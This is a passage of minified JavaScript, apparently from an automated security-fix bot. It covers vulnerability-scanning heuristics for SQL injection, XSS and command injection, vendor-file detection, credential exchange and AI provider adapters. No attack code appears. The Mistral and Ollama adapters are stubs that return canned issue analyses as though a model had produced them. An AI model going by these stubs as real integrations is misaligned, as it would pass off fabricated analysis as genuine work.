${X}`),{vulnerabilities:[],summary:{total:0,byType:{},bySeverity:{}},metadata:{language:"unknown",linesScanned:0,scanDuration:0,timestamp:new Date().toISOString()}}}isSafeUsage(X,Q){if(X.includes("#{")&&X.includes("}"))return!1;if(/params\s*\[\s*:/.test(X))return!1;return({sql_injection:[/\?/,/\$\d+/,/:\w+(?!\s*\])/,/prepare\s*\(/i,/setParameter/i,/bindParam/i],xss:[/escape/i,/sanitize/i,/encode/i,/textContent/,/innerText/,/createTextNode/],command_injection:[/escapeshellarg/i,/escapeshellcmd/i,/quote/i]}[Q]||[]).some((W)=>W.test(X))}getConfidence(X,Q){if(({sql_injection:[/\+\s*req\./,/\+\s*request\./,/\$\{.*req\./,/`.*\$\{.*req\./],xss:[/innerHTML\s*=\s*[^'"]*req\./,/document\.write\s*\([^)]*req\./,/\$\([^)]+\)\.html\s*\([^)]*req\./]}[Q]||[]).some((W)=>W.test(X)))return 90;if(this.isSafeUsage(X,Q))return 30;return 60}}var nm1;var BQ=$1(()=>{$X();s7();y1();SD();BU();nm1=new U7});class _8{baseUrl;apiKey;constructor(X){if(typeof X==="string")this.apiKey=X,this.baseUrl=process.env.RSOLV_API_URL||"https://api.rsolv.dev";else this.baseUrl=X.baseUrl,this.apiKey=X.apiKey}async createFixAttempt(X){let Q={github_org:X.repository_full_name?.split("/")[0]||"unknown",repo_name:X.repository_full_name?.split("/")[1]||"unknown",issue_number:X.issue_number,pr_number:parseInt(X.github_pr_url?.split("/").pop()||"0"),pr_title:X.issue_title||"RSOLV Fix",pr_url:X.github_pr_url,issue_title:X.issue_title,issue_url:X.github_issue_url,api_key_used:this.apiKey,metadata:{ai_provider:X.ai_provider,ai_model:X.ai_model,security_vulnerabilities_found:X.security_vulnerabilities_found,estimated_time_saved_hours:X.estimated_time_saved_hours}};return this.recordFixAttempt(Q)}async recordFixAttempt(X){try{let Q=await fetch(`${this.baseUrl}/api/v1/fix-attempts`,{method:"POST",headers:{"Content-Type":"application/json","x-api-key":this.apiKey},body:JSON.stringify(X)});if(Q.ok)return{success:!0,data:await Q.json()};else{let J=await Q.json();return{success:!1,error:`API Error: ${Q.status} - ${JSON.stringify(J)}`}}}catch(Q){return{success:!1,error:Q instanceof Error?Q.message:"Unknown error"}}}async validateVulnerabilities(X){let J=new AbortController,Y=setTimeout(()=>J.abort(),120000);try{let W=await fetch(`${this.baseUrl}/api/v1/vulnerabilities/validate`,{method:"POST",headers:{"Content-Type":"application/json","x-api-key":this.apiKey},body:JSON.stringify(X),signal:J.signal});if(clearTimeout(Y),!W.ok){let G=await W.text();throw Error(`Validation API error: ${W.status} - ${G}`)}return W.json()}catch(W){if(clearTimeout(Y),W instanceof Error&&W.name==="AbortError")throw Error("AST validation timed out after 120000ms");throw W}}}import*as sY from"path";import*as FU from"fs/promises";class AX{VENDOR_PATTERNS=["node_modules","vendor","bower_components","jspm_packages","packages","third_party","external","libs","dependencies","dist","app/assets/javascripts","public/assets","public/packs","static/vendor","public/vendor","build","_build","out"];MINIFIED_PATTERNS=[".min.js","-min.js",".bundle.js",".min.css","-min.css"];STATIC_ASSET_DIRS=["/static/","/assets/","/public/","/wwwroot/","/resources/"];LARGE_FILE_THRESHOLD=50000;VENDOR_INDICATORS={filePatterns:[/jquery[.-]?([\d.]+)?(?:\.min)?\.js$/i,/bootstrap[.-]?([\d.]+)?(?:\.min)?\.(?:js|css)$/i,/angular[.-]?([\d.]+)?(?:\.min)?\.js$/i,/react[.-]?([\d.]+)?(?:\.min)?\.js$/i,/vue[.-]?([\d.]+)?(?:\.min)?\.js$/i,/lodash[.-]?([\d.]+)?(?:\.min)?\.js$/i,/moment[.-]?([\d.]+)?(?:\.min)?\.js$/i,/d3[.-]?([\d.]+)?(?:\.min)?\.js$/i,/chart[.-]?([\d.]+)?(?:\.min)?\.js$/i,/raphael[.-]?([\d.]+)?(?:\.min)?\.js$/i,/backbone[.-]?([\d.]+)?(?:\.min)?\.js$/i,/underscore[.-]?([\d.]+)?(?:\.min)?\.js$/i,/ember[.-]?([\d.]+)?(?:\.min)?\.js$/i,/handlebars[.-]?([\d.]+)?(?:\.min)?\.js$/i,/axios[.-]?([\d.]+)?(?:\.min)?\.js$/i,/three[.-]?([\d.]+)?(?:\.min)?\.js$/i,/popper[.-]?([\d.]+)?(?:\.min)?\.js$/i,/leaflet[.-]?([\d.]+)?(?:\.min)?\.js$/i],headerComments:[/\/\*!?\s*jQuery\s+v?([\d.]+)/i,/\/\*!?\s*Bootstrap\s+v?([\d.]+)/i,/\/\*!?\s*Angular\s+v?([\d.]+)/i,/\/\*!?\s*React\s+v?([\d.]+)/i,/\/\*!?\s*Vue\.js\s+v?([\d.]+)/i,/Copyright\s+\(c\)\s+.*\s+Foundation/i,/Licensed\s+under\s+MIT/i,/Licensed\s+under\s+the\s+Apache\s+License/i,/Copyright\s+\d{4}\s+Google/i,/Copyright\s+The\s+Closure\s+Library/i,/google\.charts|google\.load|goog\.provide/i,/\/\*!?\s*\w+\.js\s+v?\d+\.\d+\.\d+/]};async isVendorFile(X,Q){if(this.matchesVendorPattern(X))return!0;if(this.isMinified(X))return!0;if(this.matchesKnownLibrary(X))return!0;if(Q&&this.isContentMinified(Q))return!0;if(await this.containsVendorIndicators(X,Q))return!0;if(Q&&this.isLargeStaticAsset(X,Q))return!0;return!1}async containsVendorIndicators(X,Q){if(Q)return this.hasVendorHeader(Q);try{let Y=(await FU.readFile(X,"utf-8")).substring(0,500);return this.hasVendorHeader(Y)}catch{return!1}}async identifyLibrary(X,Q){if(!(await this.isVendorFile(X)||Q&&this.hasVendorHeader(Q)))return null;if(Q){let W=this.extractFromHeader(Q);if(W)return W}let Y=this.extractFromPath(X);if(Y)return Y;if(!Q)try{let G=(await FU.readFile(X,"utf-8")).substring(0,500);return this.extractFromHeader(G)}catch{}return{name:"unknown-vendor",version:"unknown"}}matchesVendorPattern(X){let Q=X.replace(/\\/g,"/");return this.VENDOR_PATTERNS.some((J)=>Q.includes(`/${J}/`)||Q.includes(`${J}/`))}isMinified(X){let Q=sY.basename(X).toLowerCase();return this.MINIFIED_PATTERNS.some((J)=>Q.includes(J))}isContentMinified(X){let Q=X.split(`
`);if(Q.length===0)return!1;if(Q.length<=3&&X.length>1000)return!0;let J=Q.filter((W)=>W.length>10);if(J.length===0)return!1;if(J.reduce((W,G)=>W+G.length,0)/J.length>500)return!0;if(Q.some((W)=>W.length>5000))return!0;return!1}isLargeStaticAsset(X,Q){let J=X.replace(/\\/g,"/");if(!/\.(js|css)$/.test(J))return!1;if(!this.STATIC_ASSET_DIRS.some((G)=>J.includes(G)))return!1;return Q.length>this.LARGE_FILE_THRESHOLD}matchesKnownLibrary(X){let Q=sY.basename(X);return this.VENDOR_INDICATORS.filePatterns.some((J)=>J.test(Q))}hasVendorHeader(X){return this.VENDOR_INDICATORS.headerComments.some((Q)=>Q.test(X))}extractFromPath(X){let Q=sY.basename(X);for(let Y of this.VENDOR_INDICATORS.filePatterns){let W=Q.match(Y);if(W){let G=this.getLibraryNameFromPattern(Y),H=W[1]||"unknown";return{name:G,version:H}}}let J=Q.match(/^([\w-]+)[.-]([\d.]+)(?:\.min)?\.(?:js|css)$/);if(J)return{name:J[1].toLowerCase(),version:J[2]};return null}extractFromHeader(X){let Q=X.match(/\/\*!?\s*Bootstrap\s+v?([\d.]+)(?:\s+\([^)]+\))?/i);if(Q)return{name:"bootstrap",version:Q[1]||"unknown"};for(let J of this.VENDOR_INDICATORS.headerComments){let Y=X.match(J);if(Y){let W=this.getLibraryNameFromHeader(X,J),G=Y[1]||"unknown";if(W)return{name:W.toLowerCase(),version:G}}}return null}getLibraryNameFromPattern(X){let J=X.source.match(/^(\w+)/);return J?J[1].toLowerCase():"unknown"}getLibraryNameFromHeader(X,Q){let J=Q.source;if(J.includes("jQuery"))return"jquery";if(J.includes("Bootstrap"))return"bootstrap";if(J.includes("Angular"))return"angular";if(J.includes("React"))return"react";if(J.includes("Vue"))return"vue";let Y=X.match(/\/\*!?\s*(\w+)(?:\.js)?\s+v/i);if(Y)return Y[1].toLowerCase();return null}}var qQ=()=>{};var OU,AU;var RU=$1(()=>{OU=["critical","high","medium","low"],AU={critical:0,high:1,medium:2,low:3}});class DU{credentials=new Map;apiKey=null;refreshTimers=new Map;rsolvApiUrl=process.env.RSOLV_API_URL||"https://api.rsolv.ai";featureFlags={};async initialize(X){this.apiKey=X,V.info("Initializing RSOLV credential manager");try{let Q={api_key:X,providers:["anthropic","openai","openrouter"],ttl_minutes:60};V.info(`Requesting credential exchange from ${this.rsolvApiUrl}/api/v1/credentials/exchange`);let J=await fetch(`${this.rsolvApiUrl}/api/v1/credentials/exchange`,{method:"POST",headers:{"x-api-key":X,"Content-Type":"application/json","X-GitHub-Job":process.env.GITHUB_JOB||"","X-GitHub-Run":process.env.GITHUB_RUN_ID||""},body:JSON.stringify(Q),signal:AbortSignal.timeout(15000)});if(!J.ok){let W=await J.json();throw V.error(`Credential exchange failed - Status: ${J.status}, Body:`,W),Error(`Failed to exchange credentials: ${W.error||J.statusText}`)}let Y=await J.json();if(!Y||!Y.credentials)throw V.error("Invalid credential exchange response:",Y),Error("Invalid response from credential exchange API");if(Object.entries(Y.credentials).forEach(([W,G])=>{V.debug(`Storing credential for ${W}`,{hasApiKey:!!G.api_key,apiKeyLength:G.api_key?.length||0,expiresAt:G.expires_at}),this.credentials.set(W,G)}),Y.feature_flags)this.featureFlags=Y.feature_flags,V.info("[CredentialManager] Feature flags received:",JSON.stringify(this.featureFlags)),V.info(`[CredentialManager] use_legacy_claude_adapter=${this.featureFlags.use_legacy_claude_adapter}`);else V.info("[CredentialManager] No feature_flags in response");if(Y.usage?.remaining_fixes!==void 0)V.info(`Credentials initialized. Remaining fixes: ${Y.usage.remaining_fixes}`);else V.info("Credentials initialized")}catch(Q){throw V.error("Failed to initialize credentials",Q),Q}}getFeatureFlags(){return this.featureFlags}shouldUseLegacyAdapter(){let X=this.featureFlags.use_legacy_claude_adapter===!0;return V.info(`[CredentialManager] shouldUseLegacyAdapter() called: featureFlags=${JSON.stringify(this.featureFlags)}, returning=${X}`),X}async getCredential(X){let Q=this.credentials.get(X);if(V.debug(`Getting credential for ${X}`,{hasCredential:!!Q,hasApiKey:!!Q?.api_key,apiKeyLength:Q?.api_key?.length||0}),!Q)throw Error(`No valid credential for ${X}`);if(new Date(Q.expires_at)<new Date){V.info(`Credential for ${X} expired, refreshing...`),await this.refreshCredentials();let Y=this.credentials.get(X);if(!Y||!Y.api_key)throw Error(`Failed to refresh credential for ${X}`);return Y.api_key}if(!Q.api_key)throw Error(`Credential for ${X} has no API key`);return Q.api_key}async refreshCredentials(){if(!this.apiKey)throw Error("Cannot refresh credentials: API key not set");V.info("Refreshing expired credentials");try{let X={api_key:this.apiKey,providers:["anthropic","openai","openrouter"],ttl_minutes:60},Q=await fetch(`${this.rsolvApiUrl}/api/v1/credentials/exchange`,{method:"POST",headers:{"x-api-key":this.apiKey,"Content-Type":"application/json","X-GitHub-Job":process.env.GITHUB_JOB||"","X-GitHub-Run":process.env.GITHUB_RUN_ID||""},body:JSON.stringify(X),signal:AbortSignal.timeout(15000)});if(!Q.ok){let Y=await Q.json();throw V.error(`Credential refresh failed - Status: ${Q.status}, Body:`,Y),Error(`Failed to refresh credentials: ${Y.error||Q.statusText}`)}let J=await Q.json();if(!J||!J.credentials)throw V.error("Invalid credential refresh response:",J),Error("Invalid response from credential refresh API");Object.entries(J.credentials).forEach(([Y,W])=>{V.debug(`Refreshed credential for ${Y}`,{hasApiKey:!!W.api_key,apiKeyLength:W.api_key?.length||0,expiresAt:W.expires_at}),this.credentials.set(Y,W)}),V.info("Successfully refreshed credentials")}catch(X){throw V.error("Failed to refresh credentials:",X),X}}async reportUsage(X,Q){try{let J=await fetch(`${this.rsolvApiUrl}/api/v1/usage/report`,{method:"POST",headers:{"x-api-key":this.apiKey||"","Content-Type":"application/json"},body:JSON.stringify({provider:X,tokens_used:Q.tokensUsed,request_count:Q.requestCount,job_id:process.env.GITHUB_JOB}),signal:AbortSignal.timeout(1e4)});if(!J.ok)V.warn(`Failed to report usage for ${X}: ${J.statusText}`)}catch(J){V.warn(`Error reporting usage for ${X}:`,J)}}cleanup(){this.refreshTimers.forEach((X)=>clearTimeout(X)),this.refreshTimers.clear(),this.credentials.clear(),V.info("Credential manager cleaned up")}}var vD=$1(()=>{y1()});var K7={};Y9(K7,{CredentialManagerSingleton:()=>eY});var eY;var RX=$1(()=>{vD();y1();eY=class eY{static instances=new Map;static initPromises=new Map;static async getInstance(X){if(this.instances.has(X))return V.debug("Reusing existing credential manager for API key"),this.instances.get(X);if(this.initPromises.has(X))return V.debug("Waiting for in-progress initialization for API key"),this.initPromises.get(X);let Q=this.createAndInitializeManager(X);this.initPromises.set(X,Q);try{return await Q}finally{this.initPromises.delete(X)}}static async createAndInitializeManager(X){V.info("Creating new credential manager instance");let Q=new DU;try{return await this.initializeWithRetry(Q,X),this.instances.set(X,Q),Q}catch(J){throw Q.cleanup(),J}}static async initializeWithRetry(X,Q,J=3){let Y=null;for(let W=1;W<=J;W++)try{V.debug(`Initializing credential manager (attempt ${W}/${J})`),await X.initialize(Q);return}catch(G){if(Y=G,V.warn(`Credential initialization failed (attempt ${W}/${J}): ${Y.message}`),W<J){let H=1000*Math.pow(2,W-1);V.debug(`Waiting ${H}ms before retry`),await new Promise(($)=>setTimeout($,H))}}throw Error(`Failed to initialize credentials after ${J} attempts: ${Y?.message}`)}static clearInstance(X){let Q=this.instances.get(X);if(Q)Q.cleanup(),this.instances.delete(X),V.debug("Cleared credential manager instance for API key");this.initPromises.delete(X)}static cleanup(){V.info(`Cleaning up ${this.instances.size} credential manager instances`),this.instances.forEach((X)=>X.cleanup()),this.instances.clear(),this.initPromises.clear()}static getInstanceCount(){return this.instances.size}}});function z6(X){let Q=X;Q=Q.replace(/https?:\/\/api\.[a-zA-Z0-9.-]+\.(com|ai|dev|io)(\/[a-zA-Z0-9/\-._~:/?#[\]@!$&'()*+,;=]*)?/gi,"API endpoint"),Q=Q.replace(/\b(sk-proj-|sk-|ant_|key[:\s]+)[a-zA-Z0-9_\-]{8,}/gi,"API credential"),Q=Q.replace(/\b(api[_-]?key|token|secret|credential)([:\s]+)[a-zA-Z0-9_\-]{8,}/gi,"$1$2[REDACTED]"),Q=Q.replace(/\b[A-Z][A-Z0-9_]*_API_KEY\b/g,"API_KEY"),Q=Q.replace(/\b(claude-[0-9a-z\-\.]+|gpt-[0-9a-z\-\.]+|text-davinci-[0-9]+)\b/gi,"AI model");let Y=new RegExp(`\\b(${["anthropic","claude","openai","gpt","mistral","ollama","gemini","bard"].join("|")})\\b`,"gi");if(Q=Q.replace(Y,"AI provider"),Q.includes("Failed to connect to"))Q=Q.replace(/Failed to connect to .+ API/g,"Failed to connect to AI provider API");return Q=Q.replace(/\/v\d+\/[a-zA-Z]+/g,"/api/endpoint"),Q=Q.replace(/\/chat\/completions/g,"/api/endpoint"),Q=Q.replace(/\s+/g," ").trim(),Q=Q.replace(/AI provider provider/gi,"AI provider"),Q=Q.replace(/API credential credential/gi,"API credential"),Q}function ZQ(X,Q,J="STANDARD"){if(X.maxTokens!==void 0)return X.maxTokens;if(Q.maxTokens!==void 0)return Q.maxTokens;let Y=Q?.model?.toLowerCase();if(Y?.includes("sonnet-4"))return NU[J];else if(Y?.includes("sonnet")){let W=NU[J];return Math.min(W,8000)}return NU[J]}function xD(X){if(X<=0)throw Error(`Invalid token limit: ${X}. Must be positive.`);if(X>200000)throw Error(`Token limit too high: ${X}. Maximum is 200,000.`)}function fD(X,Q){let J=Q?.model?.toLowerCase();if(J?.includes("sonnet-4")){let W=ZQ(X,Q,"TEST_GENERATION");return xD(W),W}else if(J?.includes("sonnet"))return 8000;let Y=ZQ(X,Q,"TEST_GENERATION");return xD(Y),Y}var NU;var wU=$1(()=>{NU={STANDARD:4000,TEST_GENERATION:1e4,CODE_ANALYSIS:8000,FIX_GENERATION:16000}});function XW(X){return Wu1.has(X)}function Gu1(X){return new Promise((Q)=>setTimeout(Q,X))}function Hu1(X,Q,J){let Y=Q*Math.pow(2,X-1);return Math.min(Y,J)}function $u1(X){if(X instanceof LX)return X.isRetryable();return!1}async function CU(X,Q={}){let{maxRetries:J=IU.maxRetries,baseDelayMs:Y=IU.baseDelayMs,maxDelayMs:W=IU.maxDelayMs,onRetry:G,shouldRetry:H=$u1}=Q,$,z=0;while(z<=J)try{return await X()}catch(U){if($=U,!H(U))throw U;if(z>=J)throw V.warn(`All ${J} retry attempts exhausted`,{error:U instanceof Error?U.message:String(U)}),U;z++;let K=Hu1(z,Y,W);if(V.info(`Retryable error encountered, attempt ${z}/${J}`,{error:U instanceof Error?U.message:String(U),statusCode:U instanceof LX?U.statusCode:void 0,delayMs:K}),G&&U instanceof Error)G({attempt:z,error:U,delayMs:K});await Gu1(K)}throw $}var Wu1,LX,IU;var hD=$1(()=>{y1();Wu1=new Set([429,502,503,529]);LX=class LX extends Error{statusCode;constructor(X,Q){super(X);this.name="RetryableError",this.statusCode=Q}isRetryable(){return XW(this.statusCode)}};IU={maxRetries:3,baseDelayMs:1000,maxDelayMs:30000}});async function k6(X){let Q=null;if(X.useVendedCredentials)try{let J=process.env.RSOLV_API_KEY;if(!J)throw Error("RSOLV_API_KEY environment variable not set for vended credentials");V.info("Getting credential manager singleton for vended credentials"),Q=await eY.getInstance(J),V.info("Credential manager singleton retrieved successfully")}catch(J){throw V.error("Failed to get credential manager singleton",J),J}switch(X.provider.toLowerCase()){case"openai":return new yD(X,Q);case"anthropic":case"claude-code":return new gD(X,Q);case"mistral":return new mD(X,Q);case"ollama":return new uD(X,Q);default:throw Error(`Unsupported AI provider: ${X.provider}`)}}class yD{config;credentialManager;constructor(X,Q){if(this.config=X,this.credentialManager=Q,!X.useVendedCredentials&&!X.apiKey)throw Error("AI provider API key is required")}async complete(X,Q={}){try{return V.debug("Sending request to AI provider",{prompt:X.substring(0,100)+"..."}),await CU(()=>this.makeApiCall(X,Q),{maxRetries:3,baseDelayMs:1000,maxDelayMs:1e4,onRetry:({attempt:Y,error:W,delayMs:G})=>{let H=W instanceof LX?W.statusCode:"unknown";V.warn(`API call failed (status: ${H}), retry ${Y}/3 after ${G}ms`)}})}catch(J){throw V.error("AI provider API error",J),Error(z6(`AI provider error: ${J instanceof Error?J.message:String(J)}`))}}async makeApiCall(X,Q){try{let J=this.config.baseUrl||"https://api.openai.com/v1",Y=Q.model||this.config.model||"gpt-4",W=Q.temperature??this.config.temperature??0.2,G=ZQ(Q,this.config,"STANDARD"),H={model:Y,messages:[{role:"user",content:X}],temperature:W,max_tokens:G,frequency_penalty:Q.frequencyPenalty??0,presence_penalty:Q.presencePenalty??0},$;try{$=this.config.useVendedCredentials?await this.credentialManager?.getCredential("openai"):this.config.apiKey}catch(B){throw Error("Failed to retrieve API key")}if(!$)throw Error("Failed to retrieve API key");let z=await fetch(`${J}/chat/completions`,{method:"POST",headers:{"Content-Type":"application/json",Authorization:`Bearer ${$}`},body:JSON.stringify(H)});if(!z.ok){let B=await z.json().catch(()=>({})),q=z6(`AI provider error (${z.status}): ${B.error?.message||z.statusText}`);if(XW(z.status))throw new LX(q,z.status);throw Error(q)}let U=await z.json(),K=U.choices[0]?.message?.content||"";if(this.config.useVendedCredentials&&this.credentialManager){let B=U.usage?.total_tokens||0;await this.credentialManager.reportUsage("openai",{tokensUsed:B,requestCount:1})}return K}catch(J){throw V.error("Error calling AI provider API",J),J}}getMockResponse(X){return`Analysis of the issue:

This appears to be a bug in the authentication system where token validation is failing for valid tokens that contain special characters. The issue is likely in the token parsing logic.

Files to modify:
- \`src/auth/tokenValidator.js\`
- \`src/utils/stringEscaping.js\`

Suggested Approach:
The token validator is not properly handling URL-encoded characters. We need to update the validation function to properly decode tokens before validation, and ensure that special characters are correctly handled throughout the authentication flow.`}}class gD{config;credentialManager;constructor(X,Q){if(this.config=X,this.credentialManager=Q,!X.useVendedCredentials&&!X.apiKey)throw Error("AI provider API key is required")}async complete(X,Q={}){try{return V.debug("Sending request to AI provider",{prompt:X.substring(0,100)+"..."}),await CU(()=>this.makeApiCall(X,Q),{maxRetries:3,baseDelayMs:1000,maxDelayMs:1e4,onRetry:({attempt:Y,error:W,delayMs:G})=>{let H=W instanceof LX?W.statusCode:"unknown";V.warn(`API call failed (status: ${H}), retry ${Y}/3 after ${G}ms`)}})}catch(J){throw V.error("AI provider API error",J),Error(z6(`AI provider error: ${J instanceof Error?J.message:String(J)}`))}}async makeApiCall(X,Q){try{let J=this.config.baseUrl||"https://api.anthropic.com",Y=Q.model||this.config.model||"claude-sonnet-4-5-20250929",W=Q.temperature??this.config.temperature??0.2,G=ZQ(Q,this.config,"STANDARD");if(Q.thinking&&Q.thinking.budget_tokens>=G)G=Q.thinking.budget_tokens+8000,V.info(`[Extended Thinking] Adjusted max_tokens to ${G} (budget: ${Q.thinking.budget_tokens} + 8000 for response)`);let H={model:Y,messages:[{role:"user",content:X}],max_tokens:G};if(Q.thinking)H.thinking=Q.thinking,V.info(`[Extended Thinking] Enabled with budget: ${Q.thinking.budget_tokens} tokens`);else H.temperature=W;V.info(`[API Request Debug] Model: ${Y}, Temperature: ${W}, MaxTokens: ${G}`),V.info(`[API Request Debug] Prompt length: ${X.length} characters`),V.debug(`[API Request Debug] Prompt preview (first 500 chars): ${X.substring(0,500)}`),V.debug(`[API Request Debug] Using vended credentials: ${this.config.useVendedCredentials}`);let $;try{if(this.config.useVendedCredentials){if(V.debug(`Attempting to get vended credential - credentialManager exists: ${!!this.credentialManager}`),!this.credentialManager)throw Error("Credential manager not initialized for vended credentials");$=await this.credentialManager.getCredential("anthropic")}else $=this.config.apiKey}catch(B){throw V.error("Failed to get API key",{useVended:this.config.useVendedCredentials,hasCredentialManager:!!this.credentialManager,error:B instanceof Error?B.message:String(B)}),Error(`Failed to retrieve API key: ${B instanceof Error?B.message:String(B)}`)}if(!$)throw Error("Failed to retrieve API key - key is empty");let z=await fetch(`${J}/v1/messages`,{method:"POST",headers:{"Content-Type":"application/json","X-API-Key":$,"anthropic-version":"2023-06-01"},body:JSON.stringify(H)});if(!z.ok){let B=await z.json().catch(()=>({})),q=z6(`AI provider error (${z.status}): ${B.error?.message||z.statusText}`);if(XW(z.status))throw new LX(q,z.status);throw Error(q)}let U=await z.json(),K="";if(Array.isArray(U.content)){for(let B of U.content)if(B.type==="thinking")V.info(`[Extended Thinking] Thinking block: ${B.thinking?.length||0} chars`),V.debug(`[Extended Thinking] Thinking preview: ${B.thinking?.substring(0,500)||""}`);else if(B.type==="text")K+=B.text||""}if(!K&&U.content?.[0]?.text)K=U.content[0].text;if(V.info(`[API Response Debug] Status: ${z.status}, Model: ${Y}`),V.info(`[API Response Debug] Requested maxTokens: ${G}`),V.info(`[API Response Debug] Response usage - input: ${U.usage?.input_tokens}, output: ${U.usage?.output_tokens}, total: ${U.usage?.total_tokens}`),V.info(`[API Response Debug] Response length: ${K.length} characters`),V.info(`[API Response Debug] Stop reason: ${U.stop_reason}`),U.stop_reason==="max_tokens")V.warn(`[API Response Debug] Response truncated at max_tokens limit! Output tokens: ${U.usage?.output_tokens}`);if(K.length>200)V.debug(`[API Response Debug] Response tail: ${K.substring(K.length-200)}`);if(this.config.useVendedCredentials&&this.credentialManager){let B=U.usage?.total_tokens||0;await this.credentialManager.reportUsage("anthropic",{tokensUsed:B,requestCount:1})}return K}catch(J){throw V.error("Error calling AI provider API",J),J}}getMockResponse(X){return`Based on my analysis, this is a performance issue in the data processing pipeline.

The main bottleneck appears to be in the file processing function that's not properly streaming large files, leading to excessive memory usage.

Files that need modification:
- \`src/services/fileProcessor.js\`
- \`src/utils/streamHandler.js\`

This is a medium complexity issue that will require implementing proper stream processing instead of loading the entire file into memory. The fix should significantly reduce memory usage and improve processing speed.`}}class mD{config;credentialManager;constructor(X,Q){if(this.config=X,this.credentialManager=Q,!X.useVendedCredentials&&!X.apiKey)throw Error("AI provider API key is required")}async complete(X,Q={}){try{return V.debug("Sending request to AI provider",{prompt:X.substring(0,100)+"..."}),await this.simulateApiCall(X,Q)}catch(J){throw V.error("AI provider API error",J),Error(z6(`AI provider error: ${J instanceof Error?J.message:String(J)}`))}}async simulateApiCall(X,Q){return await new Promise((J)=>setTimeout(J,550)),`This is a documentation issue where the installation instructions are unclear for Windows users.

The documentation needs to be updated to include Windows-specific commands and requirements.

Files to modify:
- \`docs/installation.md\`
- \`README.md\`

This is a simple fix that involves adding a new section for Windows installation instructions, including how to set up the environment variables correctly and handle path differences.`}}class uD{config;credentialManager;constructor(X,Q){this.config=X,this.credentialManager=Q}async complete(X,Q={}){try{return V.debug("Sending request to AI provider",{prompt:X.substring(0,100)+"..."}),await this.simulateApiCall(X,Q)}catch(J){throw V.error("AI provider API error",J),Error(z6(`AI provider error: ${J instanceof Error?J.message:String(J)}`))}}async simulateApiCall(X,Q){return await new Promise((J)=>setTimeout(J,1000)),`I've analyzed the feature request for adding pagination to the API endpoints.

This is a medium complexity task that will require modifying multiple files:
- \`src/controllers/userController.js\`
- \`src/services/queryService.js\`
- \`src/middleware/pagination.js\` (new file needed)

The approach should be to create a reusable pagination middleware that can be applied to all list endpoints. This will require updating the query service to support limit and offset parameters, and updating the controllers to use the new middleware.`}}var N5=$1(()=>{y1();RX();wU();hD()});function cD(X){return`I need you to analyze the following software issue and provide a technical assessment.

Issue Title: ${X.title}

Issue Description:
${X.body}

Repository: ${X.repository.fullName}
Primary Language: ${X.repository.language||"Unknown"}

Please provide:
1. A determination of what type of issue this is (bug, feature request, refactoring, etc.)
2. Which files are likely to need modification
3. An estimate of the complexity (simple, medium, complex)
4. A suggested approach to solve the issue

Focus on technical details and be specific about the implementation approach. If the issue description lacks critical information, note what additional context would be needed.`}function lD(X,Q,J){let Y=`I need you to generate a solution for the following software issue:

Issue Title: ${X.title}

Issue Description:
${X.body}

Repository: ${X.repository.fullName}
Primary Language: ${X.repository.language||"Unknown"}

Based on my analysis, this is a ${Q.issueType} issue with ${Q.estimatedComplexity} complexity.

The suggested approach is: ${Q.suggestedApproach}

I need you to generate specific code changes to resolve this issue. Here are the relevant files with their current content:
`;for(let[W,G]of Object.entries(J))Y+=`
--- ${W} ---
\`\`\`
${G}
\`\`\`
`;return Y+=`
IMPORTANT: Format your response EXACTLY as shown below for proper parsing:

CRITICAL: You MUST modify EXISTING files only. DO NOT create new files. Make changes in-place to fix the vulnerability.

For each file that needs to be modified, use one of these formats:

Option 1 (preferred):
filename.ext:
\`\`\`language
[complete file content]
\`\`\`

Option 2:
--- filename.ext ---
\`\`\`language
[complete file content]
\`\`\`

Example:
src/auth/login.js:
\`\`\`javascript
function authenticateUser(username, password) {
  // secure implementation here
}
\`\`\`

CRITICAL: The parser requires EXACT formatting. Use one of the above formats or the solution will fail.

After all file changes, add:
1. Brief explanation of changes
2. How this fixes the issue
3. Any assumptions made

Provide complete, working code following existing patterns.`,Y}function pD(X,Q,J){let Y=Object.keys(J).join(", ");return`I need you to generate a clear, professional pull request description for the following changes.

Issue: ${X.title} (#${X.number})

Issue Type: ${Q.issueType}
Complexity: ${Q.estimatedComplexity}

Files modified: ${Y}

Approach taken: ${Q.suggestedApproach}

Please generate a pull request description with:
1. A clear, concise title that summarizes the change
2. A detailed description explaining what was changed and why
3. Any testing instructions or considerations for reviewers
4. References to the original issue

Keep the tone professional but friendly, and focus on the technical details that would be relevant to code reviewers.`}function dD(X){switch(X){case"bug":return"For this bug fix, focus on identifying the root cause first before implementing a solution. Consider edge cases and ensure your fix doesn't introduce regressions. Include tests that verify the fix works as expected.";case"feature":return"For this feature implementation, ensure the solution is well-integrated with the existing architecture. Consider backward compatibility, error handling, and appropriate documentation. Include tests for the new functionality.";case"refactoring":return"For this refactoring task, maintain identical functionality while improving the code structure. Focus on readability, maintainability, and adherence to design principles. Ensure tests pass before and after your changes.";case"performance":return"For this performance improvement, focus on identifying bottlenecks and optimizing critical paths. Consider time and space complexity, and measure before/after metrics where possible. Be careful not to sacrifice code readability for marginal gains.";case"security":return"For this security issue, approach with extra caution. Ensure the fix addresses the root vulnerability completely without introducing new attack vectors. Consider all possible exploit scenarios and follow security best practices.";case"documentation":return"For this documentation task, focus on clarity, completeness, and accuracy. Ensure examples are working and up-to-date. Consider both beginner and advanced users, and follow any documentation style guidelines present in the project.";case"dependency":return"For this dependency update, carefully check for breaking changes and necessary adjustments to the codebase. Update any affected tests and documentation. Consider whether the update brings security fixes that should be highlighted.";case"test":return"For this testing task, ensure comprehensive coverage of edge cases and typical usage patterns. Follow existing testing patterns and naming conventions. Consider both unit and integration tests as appropriate for the code being tested.";default:return"For this task, ensure your solution is well-integrated with the existing codebase and follows the project's coding conventions. Include appropriate error handling, documentation, and tests."}}var iD={};Y9(iD,{analyzeIssue:()=>Q8});async function Q8(X,Q,J){if(V.info(`Analyzing issue #${X.number} with AI`),process.env.RSOLV_DEV_MODE==="true"&&process.env.RSOLV_USE_CLAUDE_MAX==="true"&&!J)return V.info("Development mode with Claude Max - using simplified analysis"),{issueType:PU(X),filesToModify:Uu1(X),estimatedComplexity:"medium",requiredContext:[],suggestedApproach:"Fix security vulnerability using Claude Code Max",confidenceScore:0.8,canBeFixed:!0};let W=J||await k6(Q.aiProvider),G=cD(X);try{let H=await W.complete(G,{temperature:Q.aiProvider.temperature||0.2,maxTokens:Q.aiProvider.maxTokens,model:Q.aiProvider.model});return V.debug("AI analysis response received",{response:H}),zu1(H,X)}catch(H){throw V.error("Error analyzing issue with AI",H),Error(`AI analysis failed: ${H instanceof Error?H.message:String(H)}`)}}function zu1(X,Q){try{V.info(`AI analysis response for issue #${Q.number}:`,X.substring(0,500));try{let 